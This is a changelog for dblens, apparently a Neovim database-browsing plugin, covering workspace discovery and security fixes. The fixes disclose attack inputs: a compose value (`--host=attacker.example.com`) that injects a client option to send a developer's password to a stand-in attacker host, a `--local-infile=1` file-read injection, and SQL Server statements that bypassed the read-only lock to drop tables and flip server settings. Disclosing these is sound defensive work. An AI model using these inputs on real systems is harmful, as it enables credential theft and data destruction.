# Changelog

All notable changes to this project are documented here. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.0.0/).

## [Unreleased]

### Added

- **Workspace discovery** (`:DbLensDiscover`): dblens offers the databases the project in front of
  you has, with where each one came from. It reads database files by a bounded walk — gitignored
  ones included, which is what a dev database usually is, and the magic header rather than the
  extension decides SQLite from DuckDB — plus `docker-compose*.yml` services and `.env`
  connection URLs and variable groups. Opening dblens with no connection configured offers what a
  scan finds instead of "add one"; `discovery.auto = false` turns that off.
  - Nothing is scanned until dblens is opened or the command is run, nothing connects without the
    user picking it, and a discovered connection opens **LOCKED** like every other connection.
  - A discovered connection is **session-only** and a password read out of a `.env` or a compose
    file stays in memory for that session: `connections.save` now writes only `source = 'file'`
    specs, so nothing discovery reads can reach the connections file.
  - The walk never follows a symlink and never reads above the workspace root, and is bounded in
    depth, entries, hits and wall-clock time, a few directories per tick. A file path a `.env`
    *names* is held to the same boundary: one resolving above the root is dropped, not offered.
  - What a workspace file says is treated as untrusted input. Every connection field that becomes
    an argument of the client dblens spawns is refused if it would be read as an **option** rather
    than as data, so a cloned repository cannot steer the client. Candidates dropped for that (or
    for any other validation failure) are reported next to what was found.

### Fixed

- **Discovery: a cloned repository could steer the mysql/mariadb client through its own argv.**
  `mysql`/`mariadb` validation carried no bare-name rule (postgres and mssql did), and the database
  was appended as a bare positional, so a `docker-compose.yml` with
  `MYSQL_DATABASE: --host=attacker.example.com` produced a candidate whose "database" the client
  parses as an option — with `MYSQL_PWD` set to a password `${VAR}` interpolation had taken from
  the developer's own environment. `--local-infile=1` re-enabled, the same way, the local file read
  the adapter disables one argument earlier. Both engines now reject a database that is not a bare
  name, every adapter rejects a host/user/database (and `dblens.path` a file path, expanded as well
  as raw) that starts with `-`, and the database is passed as `--database=<name>` so its value is
  bound to its option. Validation is shared between the two engines rather than copied.
- **Discovery: a `.env` file URL could point above the workspace root.** `sqlite:///../outside.db`
  resolved out of the project and was offered, contradicting a security property stated in the
  README, the vimdoc and this changelog. Such a candidate is now dropped.
- **Discovery: the commonest `ports:` form found nothing.** The inline flow sequence
  (`ports: ["5432:5432"]`) was not parsed at all, so a single-service compose file written that way
  discovered no database. Both sequence forms are read now, for `ports:` and `environment:`.
- **Discovery: a `/` in a URL password mis-framed the whole URL.** `postgres://u:aB3/xY9@host/app`
  parsed the host as `u:aB3`, so the real database never appeared. The authority now ends at the
  userinfo when the password holds an unencoded `/`.
- **Discovery: two of the four scan bounds pruned silently.** The depth bound and the per-category
  hit cap did not set `truncated`, so a project whose databases sit deeper than the bound was told
  "found no databases" with no caveat. All four bounds report now, and the hit cap is checked
  before the file is opened to classify it.

## [1.0.0] - 2026-08-15

First release.

### Added

- Six database engines — SQLite, PostgreSQL, MySQL, MariaDB, DuckDB and SQL Server — driven
  through the command-line client for each, with no compiled component and no server.
- A schema tree, a paged and sortable/filterable result grid, and a SQL scratch buffer with
  schema-aware completion (`omnifunc`, nvim-cmp, blink.cmp), in one tab page.
- Query history and named snippets, `EXPLAIN` / `EXPLAIN ANALYZE` where the server supports it,
  and cell/row editing (edit, insert, delete) with CSV/JSON/INSERT export.
- A record protocol that never confuses a SQL `NULL` with the text `NULL`.
- Safety model: every connection opens **LOCKED** by default, enforced by a server-side read-only
  transaction (or the file's open mode on SQLite/DuckDB) on five of the six engines, and by
  dblens's own classifier — documented as best-effort (beta), not a boundary — on SQL Server,
  where the docs, `:checkhealth` and the connection picker all steer to a read-only SQL login. A
  confirmation gate for destructive and, optionally, all writes; a `count(*)` guard proving a
  row-targeted edit matches exactly one row; refusal of known write-capable side channels while
  locked; and guidance to a database read-only role as the only hard boundary.
- Deferred-batch transaction mode with a pending-changes view, committed atomically.
- `:checkhealth dblens`, session restore, a `statusline()` segment, colorscheme-derived
  highlights, and three icon sets (Unicode, Nerd Font, ASCII).
- A single keymap registry driving bindings, the `?` help overlay, and the README/vimdoc tables,
  so none of the three can drift from what is actually bound; every action remappable or
  disable-able per scope through `setup{}`.
- 465 tests (`make test`), a stylua + luacheck lint pass (`make lint`), and CI across the
  documented Neovim floor (0.10.4), stable and nightly.

### Fixed before release

- SQL Server: the T-SQL administrative verbs classified as READS, so `SELECT 1 DBCC
  TRACEON(3999,-1)` ran clean on a LOCKED connection and flipped a global trace flag 0 → 1 —
  server-wide, and still set on a new connection, because DBCC is not transactional so the
  rolled-back wrap had nothing to undo. `DBCC FREEPROCCACHE` and `DBCC DROPCLEANBUFFERS` landed
  the same way; `BACKUP`, `RESTORE`, `DENY` and `CHECKPOINT` reached the server and were saved
  only by the wrap. `DBCC`, `BACKUP`, `RESTORE`, `DENY`, `CHECKPOINT`, `RECONFIGURE`, `KILL`,
  `SHUTDOWN`, `WRITETEXT`, `UPDATETEXT`, `DISABLE`, `ENABLE` and `RECEIVE` are now write verbs on
  T-SQL and refused at the gate (re-verified live on 2022). Scoped to that dialect, so a column
  named `backup` or `enable` is still an ordinary name on the other five engines. **Defence in
  depth, not a completeness claim** — the classifier is a blocklist over a language dblens does
  not parse, which is why `mssql` is labelled best-effort (beta) everywhere and steers to a
  read-only SQL login for a hard boundary.

- SQL Server: `EXEC('...')`/`EXECUTE('...')` classified as a function call, so
  `SELECT 1 EXEC('COMMIT TRANSACTION DROP TABLE t')` ran as a READ on a LOCKED connection —
  verified live that INSERT, TRUNCATE, DROP TABLE, CREATE DATABASE and a server-level CREATE
  LOGIN all landed. On T-SQL a write verb is now a statement wherever it appears, the locked wrap
  fails the batch when a statement commits it away, and the side-channel check reads inside string
  literals on that engine. The cost, on SQL Server only: `SELECT REPLACE(...)` is refused while
  locked.
- `ui.grid.chunk_size = 0` rescheduled the highlight loop forever at 100% CPU, past SIGTERM.
  Refused by `setup{}`, and clamped at the render site.
- The install snippets named a repository that is not this one.
- `:checkhealth` reported a green configuration after `setup{}` had been refused.
- A failed `:DbLens` left a tabpage and three scratch buffers that `:DbLensClose` could not
  reclaim, one set per retry.
- `create = true` on a locked connection failed with the client's own error; it now names the
  setting that makes it work.
- SQL Server: a cell whose value read `(N rows affected)` truncated the result set silently.
